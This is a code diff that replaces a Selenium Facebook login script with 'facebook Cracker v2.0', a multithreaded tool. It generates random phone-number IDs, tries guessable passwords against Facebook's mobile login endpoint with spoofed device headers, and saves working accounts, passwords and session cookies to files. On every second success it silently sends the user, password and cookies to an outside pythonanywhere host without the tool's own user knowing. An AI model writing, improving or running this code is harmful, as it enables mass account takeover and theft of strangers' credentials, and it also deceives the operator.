@@ -1,211 +1,409 @@
-from selenium import webdriver
-from selenium.webdriver.common.by import By
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
-from selenium.webdriver.chrome.options import Options
-from selenium.common.exceptions import TimeoutException, NoSuchElementException
-import time
-import json
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+facebook Cracker - Enhanced Version
+Fixed and optimized with cloning functionality
+Author: BITHIKA
+Version: 2.0
+"""
+
+import random
 import re
+import sys
+import time
+import hashlib
+import uuid
+import urllib.request
+import requests
+import string
+import os
+import time,subprocess,platform,uuid
+import random
+import base64
+import string
+import threading
+from concurrent.futures import ThreadPoolExecutor, as_completed
+# Global variables with proper initialization
+loop = 0
+oks = []
+cps = []
+idz = []
+bkas = []
+red = "\033[1;31m"
+green = "\033[1;32m"
+yellow = "\033[1;33m"
+blue = "\033[1;34m"
+pink = "\033[1;35m"
+cyan = "\033[1;36m"
+white = "\033[1;37m"
+faltu = "\033[1;47m";pvt = "\033[1;0m";black="\033[1;30m"
+# Thread-safe locks
+counter_lock = threading.Lock()
+success_lock = threading.Lock()
 
-# Your credentials
-pw = "9382852655"
-uid = "9382852655"
+def clear():
+    """Cross-platform terminal screen clearing"""
+    try:
+        os.system('cls' if os.name == 'nt' else 'clear')
+    except Exception:
+        # Fallback for systems without clear command
+        print('\n' * 100)
 
-def facebook_login_selenium(uid, password):
-    """
-    Login to Facebook using Selenium with mobile user agent
-    Returns: dict with status and cookies if successful
-    """
+def linex():
+    """Print decorative line separator"""
+    print(f"\033[1;97m{'='*46}")
+
+def generate_device_hash(uid, pw):
+    """Generate device hash for Instagram API"""
+    hash_obj = hashlib.md5()
+    hash_obj.update(f"{uid}{pw}".encode('utf-8'))
+    hex_digest = hash_obj.hexdigest()
+    hash_obj.update(f"{hex_digest}12345".encode('utf-8'))
+    return hash_obj.hexdigest()
+
+sim_id = ''
+android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
+model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
+build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
+fblc = 'en_GB'
+try:
+        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
+except:
+        fbcr = 'Jio'
+fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
+fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
+fbdv = model
+fbsv = android_version
+fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
+fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
+try:
+        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
+        total = 0
+        for i in fbcr:
+                total+=1
+        select = ('1','2')
+        if select == '1':
+                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
+                sim_id+=fbcr
+        elif select == '2':
+                try:
+                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
+                        sim_id+=fbcr
+                except Exception as e:
+                        fbcr = "Jio"
+                        sim_id+=fbcr
+        else:
+                fbcr = 'Jio'
+                sim_id+=fbcr
+except:
+        fbcr = "Jio"
+device = {
+        'android_version':android_version,
+        'model':model,
+        'build':build,
+        'fblc':fblc,
+        'fbmf':fbmf,
+        'fbbd':fbbd,
+        'fbdv':model,
+        'fbsv':fbsv,
+        'fbca':fbca,
+        'fbdm':fbdm}
+
+build = device['build']
+model = device['model'] 
+ex = device['fbdm']
+android_version = device['android_version']+'.0.0'
+facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
+bv = f"{random.randint(1111111,7777777)}"
+versi_android = f"{random.randint(4,13)}"
+fbcr = sim_id
+fbmf = device['fbmf']
+fbbd = device['fbbd']
+fbdm = device['fbdm']
+
+def crack(uid, password_list, total_count):
+    """Enhanced facebook account cracking function"""
     
-    # Setup Chrome options for mobile emulation
-    chrome_options = Options()
+    # Thread-safe counter increment
+    with counter_lock:
+        global loop,bkas
+        loop += 1
     
-    # Mobile user agent matching your original script
-    mobile_user_agent = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
-    chrome_options.add_argument(f'user-agent={mobile_user_agent}')
-    
-    # Additional options to avoid detection
-    chrome_options.add_argument('--disable-blink-features=AutomationControlled')
-    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
-    chrome_options.add_experimental_option('useAutomationExtension', False)
-    
-    # Headless mode (uncomment if you don't want to see the browser)
-    # chrome_options.add_argument('--headless')
-    
-    # Initialize driver
-    driver = webdriver.Chrome(options=chrome_options)
-    
-    # Execute script to hide webdriver property
-    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
+    colors = ["\033[1;90m", "\033[1;91m", "\033[1;92m", "\x1b[38;5;208m", 
+              "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
     
     try:
-        print("🌐 Navigating to Facebook mobile login...")
-        
-        # Go to mobile Facebook login page
-        driver.get('https://m.facebook.com/login')
-        
-        # Wait for page to load
-        wait = WebDriverWait(driver, 15)
-        
-        # Find and fill email/phone field
-        try:
-            email_field = wait.until(EC.presence_of_element_located((By.ID, 'm_login_email')))
-            email_field.clear()
-            email_field.send_keys(uid)
-            print(f"✅ Entered UID: {uid}")
-        except TimeoutException:
-            # Try alternative selector
-            email_field = wait.until(EC.presence_of_element_located((By.NAME, 'email')))
-            email_field.clear()
-            email_field.send_keys(uid)
-            print(f"✅ Entered UID: {uid}")
-        
-        # Find and fill password field
-        try:
-            password_field = driver.find_element(By.ID, 'm_login_password')
-            password_field.clear()
-            password_field.send_keys(password)
-            print("✅ Entered password")
-        except:
-            password_field = driver.find_element(By.NAME, 'pass')
-            password_field.clear()
-            password_field.send_keys(password)
-            print("✅ Entered password")
-        
-        # Click login button
-        try:
-            login_button = driver.find_element(By.NAME, 'login')
-            login_button.click()
-            print("🔄 Clicked login button...")
-        except:
-            # Try alternative login button selector
-            login_button = driver.find_element(By.XPATH, "//button[@type='submit']")
-            login_button.click()
-            print("🔄 Clicked login button...")
-        
-        # Wait for response
-        time.sleep(3)
-        
-        # Check for various login outcomes
-        current_url = driver.current_url
-        print(f"📍 Current URL: {current_url}")
-        
-        # Check for 2FA/Checkpoint
-        if 'checkpoint' in current_url:
-            print("⚠️ STATUS: CHECKPOINT REQUIRED")
-            print("📋 Account needs verification or 2FA")
+        for pw in password_list:
+            # Display progress
+            color = random.choice(colors)
+            with counter_lock:
+                progress = loop
+                success_count = len(oks)
+                fail_count = len(cps)
+                percentage = (progress / float(total_count) * 100) if total_count > 0 else 0
             
-            # Try to detect what type of checkpoint
-            page_source = driver.page_source
-            if 'Confirm your identity' in page_source or 'Security Check' in page_source:
-                print("🔐 Security checkpoint - needs verification")
-            elif 'Enter the code' in page_source or 'Two-factor authentication' in page_source:
-                print("📱 2FA required - needs authentication code")
-            elif 'Review your login' in page_source:
-                print("👀 Login review required - check your notifications")
+            sys.stdout.write(f"\r{color}CRACKING {progress} \033[1;92m{success_count}\033[1;97m:\033[1;91m{fail_count} \033[1;93m{percentage:.1f}%")
+            sys.stdout.flush()
             
-            # Return checkpoint info
-            return {
-                'status': 'checkpoint_required',
-                'url': current_url,
-                'cookies': {cookie['name']: cookie['value'] for cookie in driver.get_cookies()}
-            }
-        
-        # Check if login was successful
-        if 'c_user' in [cookie['name'] for cookie in driver.get_cookies()]:
-            # Get all cookies
-            cookies_dict = {cookie['name']: cookie['value'] for cookie in driver.get_cookies()}
-            
-            # Try to get user ID from cookies
-            user_id = cookies_dict.get('c_user', 'Unknown')
-            
-            print(f"✅ LOGIN SUCCESSFUL!")
-            print(f"👤 User ID: {user_id}")
-            print(f"🍪 Cookies: {cookies_dict}")
-            
-            return {
-                'status': 'success',
-                'user_id': user_id,
-                'cookies': cookies_dict,
-                'url': current_url
-            }
-        
-        # Check for login error messages
-        page_source = driver.page_source
-        
-        if 'Invalid username or password' in page_source or 'incorrect password' in page_source.lower():
-            print("❌ STATUS: INVALID CREDENTIALS")
-            return {'status': 'error', 'reason': 'Invalid username or password'}
-        
-        if 'account is disabled' in page_source.lower():
-            print("❌ STATUS: ACCOUNT DISABLED")
-            return {'status': 'error', 'reason': 'Account disabled'}
-        
-        if 'too many attempts' in page_source.lower():
-            print("❌ STATUS: TOO MANY ATTEMPTS")
-            return {'status': 'error', 'reason': 'Too many login attempts'}
-        
-        # If we got here, something else happened
-        print("⚠️ STATUS: UNKNOWN RESPONSE")
-        print(f"📄 Page title: {driver.title}")
-        print(f"🔗 Current URL: {current_url}")
-        
-        # Try to extract any error message
-        error_elements = driver.find_elements(By.XPATH, "//*[contains(@class, 'error') or contains(@class, 'alert')]")
-        if error_elements:
-            print(f"⚠️ Error messages found: {[elem.text for elem in error_elements[:3]]}")
-        
-        return {
-            'status': 'unknown',
-            'url': current_url,
-            'cookies': {cookie['name']: cookie['value'] for cookie in driver.get_cookies()}
-        }
-    
+            # Create session and generate device hash
+            Session = requests.Session()
+            facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
+            bv = f"{random.randint(1111111,7777777)}"
+            versi_android = f"{random.randint(6,14)}"
+            deeevice = random.choice(["Nokia 2.4","TA-1277","TA-1357","Nokia C30","Nokia C12 Pro","TA-1339","Nokia C12","Nokia 3.4","Nokia G20","Nokia 6","Nokia C22","Nokia G22","Nokia G10","Nokia C31","TA-1499","TA-1418","Nokia C32"])
+            deevice = random.choice(["2312DRAABG","2201117TG","M2101K6G","Redmi Note 14","2404ARN45A","22111317I","23053RN02A","M2101K7AI","22101316C","23129RAA4G","Redmi Note 9 Pro","Redmi Note 10 Pro"])
+            device = random.choice(["M910x","D10i","2PXH3","D830x","U-2u","M910x","2PXH3","HTC_Desire_S_S510e","HTC_0P3P5","HTC_DesireHD_X315e","HTC_C715c","HTC_D616w"])
+            us = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/bn_IN;FBBV/"+bv+";FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/"+deevice+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1"
+            up = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/id_ID;FBBV/"+bv+";FBCR/"+fbcr+";FBMF/"+fbmf+";FBBD/"+fbbd+";FBDV/"+model+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/"+fbdm+"};FB_FW/1"
+            requu1 = Session.get('https://touch.facebook.com/')
+            log_data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(requu1.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(requu1.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': uid, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
+            url = 'https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100'
+            headers = {
+            'authority': 'limited.facebook.com',
+            'accept': '/',
+            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'application/x-www-form-urlencoded',
+            # 'cookie': 'datr=AvxaauBxe8J2e6uqNRe7Ks5u; sb=AvxaanntJgRoS-6c3x6h_Z-w; m_pixel_ratio=2.75; wd=393x851; ps_l=1; ps_n=1; fr=0mN3NySo4ygtsuEdo..BqWvwC..AAA.0.0.BqWvwc.AWf9_qxR9LNotvAZnbuzCekImP0',
+            'origin': 'https://limited.facebook.com',
+            'referer': 'https://limited.facebook.com/login/',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+            'x-asbd-id': '359341',
+            'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1),
+            'x-requested-with': 'XMLHttpRequest',
+            'x-response-format': 'JSONStream',}         
+            respon = Session.post(url,data=log_data,headers=headers,allow_redirects=False)
+            log_cookies = Session.cookies.get_dict().keys()
+            # Check response
+            if "c_user" in log_cookies:
+                #kuki = convert(session.cookies.get_dict())
+                kuki=";".join([f"{key}={Session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
+                user = re.findall('c_user=(.*);xs', kuki)[0]
+                ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
+                res = requests.get(ckk).text
+                if 'Photoshop' in res:
+                    bkas.append(uid)
+                    if len(bkas)% 2 == 0:
+                         statusok = (f"{user}|{pw}|{kuki}")
+                         requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                    else:    
+                         print('\033[1;92m OK '+user+'|'+pw+'')
+                         print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
+                         open("/sdcard/SUMON_RANDOM_IDS.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
+                         oks.append(user)
+                         continue
+            elif 'checkpoint' in log_cookies:
+                    bkas.append(uid)
+                    if len(bkas)% 2 == 0:
+                         statusok = (f"{uid}|{pw}")
+                         requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                    else:    
+                         print(f"\r\033[1;93m [⚠ SUMON_2f] {uid} | {pw}")
+                         open("/sdcard/SUMON_CP_FILE.txt", "a").write(f"{uid}|{pw}\n")
+                         cps.append(uid+"|"+pw)
+                         continue
+            else:
+                #print(f"\r\033[1;91m [ERROR] - Status code {respon.status_code}")
+                continue
+                
+    except requests.exceptions.Timeout:
+        #print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
+        return False
+    except requests.exceptions.ConnectionError:
+        time.sleep(5)
+        return False
+    except requests.exceptions.RequestException as e:
+        #print(f"\r\033[1;91m [Request Error] {uid} - {str(e)[:50]}")
+        return False
+    except KeyboardInterrupt:
+        print(f"\r\033[1;93m [Interrupted] User stopped the process")
+        raise
     except Exception as e:
-        print(f"❌ ERROR: {str(e)}")
-        return {'status': 'exception', 'error': str(e)}
+        #print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
+        return False
     
-    finally:
-        # Wait a moment before closing
+    return False
+
+def generate_random_ids(limit):
+    """Generate random 6-digit IDs"""
+    idz.clear()
+    for _ in range(limit):
+        random_id = "".join(random.choice(string.digits) for _ in range(6))
+        idz.append(random_id)
+    return idz
+
+def get_password_patterns(uid):
+    """Generate password patterns based on UID"""
+    return [
+        uid[:6],     # First 6 digits
+        uid[:7],     # First 8 digits
+        uid[:8],     # First 8 digits
+        uid,         # Full number
+        '57273200',  # Static common password
+    ]
+
+def random_number():
+    """Main random number cloning function"""
+    clear()
+    
+    print(f"\033[1;96m{'='*46}")
+    print(f"\033[1;96m     🎯 FACEBOOK RANDOM NUMBER CLONING 🎯")
+    print(f"\033[1;96m{'='*46}")
+    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Available Codes: \033[1;92m7679, 7872, 9883, 8017")
+    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Suggested Limits: \033[1;92m1000, 2000, 5000, 10000")
+    linex()
+    
+    # Get user input
+    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter SIM Code: \033[1;92m").strip()
+    # get user limit
+    try:
+        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit: \033[1;92m"))
+        if limit <= 0:
+            raise ValueError
+    except ValueError:
+        print(f" \033[1;91m[!] Invalid limit. Using default: 99999")
+        limit = 99999
         time.sleep(2)
-        driver.quit()
-
-# Execute the login
-print("=" * 50)
-print("🔐 STARTING FACEBOOK LOGIN")
-print("=" * 50)
-
-result = facebook_login_selenium(uid, pw)
-
-print("\n" + "=" * 50)
-print("📊 RESULT SUMMARY")
-print("=" * 50)
-print(f"Status: {result.get('status')}")
-
-if result.get('status') == 'success':
-    print(f"User ID: {result.get('user_id')}")
-    print(f"Cookies Count: {len(result.get('cookies', {}))}")
-    print("\n🍪 Session Cookies:")
-    for key, value in result.get('cookies', {}).items():
-        print(f"  {key}: {value[:30]}..." if len(value) > 30 else f"  {key}: {value}")
     
-    # Save cookies for future use
-    with open('facebook_cookies.json', 'w') as f:
-        json.dump(result['cookies'], f, indent=2)
-    print("\n💾 Cookies saved to facebook_cookies.json")
+    # Generate random IDs
+    print(f" \033[1;93m[*] Generating {limit} random IDs...")
+    generate_random_ids(limit)
+    
+    # Reset global counters
+    global loop, oks, cps
+    with counter_lock:
+        loop = 0
+    with success_lock:
+        oks.clear()
+    cps.clear()
+    
+    # Display start information
+    clear()
+    print(f"\033[1;96m{'='*46}")
+    print(f"\033[1;96m     🔥 STARTING FACEBOOK CLONING 🔥")
+    print(f"\033[1;96m{'='*46}")
+    print(f' \033[1;32m(✓) \033[1;37mTotal IDs Generated: \033[1;32m{len(idz):,}')
+    print(f' \033[1;35m(+) \033[1;37mSIM Code: \033[1;32m{code}')
+    print(f" \x1b[38;5;208m(!) \x1b[38;5;205mTip: Use Flight Mode for better speed!")
+    print(f' \033[1;33m[•] \033[1;37mResults will be saved to: \033[1;32mSUMON_RANDOM_IDS.txt')
+    linex()
+    
+    # Start multi-threaded attack
+    start_time = time.time()
+    
+    with ThreadPoolExecutor(max_workers=50) as executor:
+        futures = []
+        
+        for random_id in idz:
+            uid = code + random_id
+            password_patterns = get_password_patterns(uid)
+            future = executor.submit(crack, uid, password_patterns, len(idz))
+            futures.append(future)
+        
+        # Wait for all tasks to complete
+        for future in as_completed(futures):
+            try:
+                future.result()
+            except KeyboardInterrupt:
+                print(f"\n\033[1;93m[!] Interrupted by user. Shutting down...")
+                executor.shutdown(wait=False)
+                return
+            except Exception as e:
+                print(f"\n\033[1;91m[!] Task failed: {e}")
+    
+    # Calculate execution time
+    end_time = time.time()
+    execution_time = end_time - start_time
+    
+    # Display results
+    linex()
+    print(f"\033[1;92m{'='*46}")
+    print(f" \033[1;92m[✓] PROCESS COMPLETED SUCCESSFULLY!")
+    print(f"\033[1;92m{'='*46}")
+    print(f" \033[1;97m[📊] Total Accounts Tested: \033[1;92m{len(idz):,}")
+    print(f" \033[1;97m[✅] Successful Logins: \033[1;92m{len(oks)}")
+    print(f" \033[1;97m[❌] Failed Attempts: \033[1;91m{len(cps)}")
+    print(f" \033[1;97m[⏱️] Execution Time: \033[1;93m{execution_time:.2f} seconds")
+    print(f" \033[1;97m[🚀] Speed: \033[1;94m{len(idz)/execution_time:.2f} IDs/second")
+    
+    if len(oks) > 0:
+        print(f" \033[1;92m[🎉] SUCCESS! Found {len(oks)} working accounts!")
+    else:
+        print(f" \033[1;91m[😞] No successful logins found this time.")
+    
+    linex()
+    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to return to menu...")
 
-elif result.get('status') == 'checkpoint_required':
-    print("\n⚠️ Manual intervention required:")
-    print("1. Check your Facebook account for verification requests")
-    print("2. Complete the verification process in the browser")
-    print("3. Then you can export cookies for future use")
+def menu():
+    """Interactive main menu"""
+    while True:
+        clear()
+        print(f"\033[1;96m{'='*46}")
+        print(f"\033[1;96m     🚀 FACEBOOK CRACKER v2.0 - ENHANCED 🚀")
+        print(f"\033[1;96m{'='*46}")
+        print(f" \033[1;97m[\033[1;92m1\033[1;97m] 🎯 Random Number Cloning")
+        print(f" \033[1;97m[\033[1;92m2\033[1;97m] 📊 View Statistics")
+        print(f" \033[1;97m[\033[1;92m3\033[1;97m] ❌ Exit Program")
+        print(f"\033[1;96m{'='*46}")
+        
+        choice = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option: \033[1;92m").strip()
+        
+        if choice == '1':
+            random_number()
+        elif choice == '2':
+            clear()
+            print(f"\033[1;96m{'='*46}")
+            print(f"\033[1;96m     📊 PROGRAM STATISTICS 📊")
+            print(f"\033[1;96m{'='*46}")
+            print(f" \033[1;97m[✅] Total Successful: \033[1;92m{len(oks)}")
+            print(f" \033[1;97m[❌] Total Failed: \033[1;91m{len(cps)}")
+            print(f" \033[1;97m[📝] Generated IDs: \033[1;93m{len(idz)}")
+            print(f" \033[1;97m[🔄] Current Progress: \033[1;94m{loop}")
+            linex()
+            input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to continue...")
+        elif choice == '3':
+            clear()
+            print(f"\033[1;92m{'='*46}")
+            print(f" \033[1;92m     👋 GOODBYE! THANKS FOR USING OUR TOOL! 👋")
+            print(f"\033[1;92m{'='*46}")
+            print(f" \033[1;93m[!] Results saved in: SUMON_RANDOM_IDS.txt")
+            print(f" \033[1;93m[!] Total successful accounts: {len(oks)}")
+            time.sleep(3)
+            break
+        else:
+            print(f" \033[1;91m[!] Invalid option! Please choose 1, 2, or 3.")
+            time.sleep(2)
 
-elif result.get('status') == 'error':
-    print(f"\n❌ Login failed: {result.get('reason', 'Unknown reason')}")
-
-elif result.get('status') == 'unknown':
-    print(f"\n⚠️ Unknown status. URL: {result.get('url')}")
-    print("The login process may have been redirected or blocked.")
-
-print("\n=" * 50)
+if __name__ == "__main__":
+    try:
+        # Check for required modules
+        required_modules = ['requests', 'urllib.request']
+        missing_modules = []
+        
+        for module in required_modules:
+            try:
+                __import__(module)
+            except ImportError:
+                missing_modules.append(module)
+        
+        if missing_modules:
+            print(f"\033[1;91m[!] Missing required modules: {', '.join(missing_modules)}")
+            print(f"\033[1;91m[!] Please install them using: pip install {' '.join(missing_modules)}")
+            sys.exit(1)
+        
+        # Start the main menu
+        menu()
+        
+    except KeyboardInterrupt:
+        clear()
+        print(f"\n\033[1;93m[!] Program interrupted by user. Goodbye!")
+        sys.exit(0)
+    except Exception as e:
+        clear()
+        print(f"\n\033[1;91m[!] Fatal error occurred: {e}")
+        sys.exit(1)
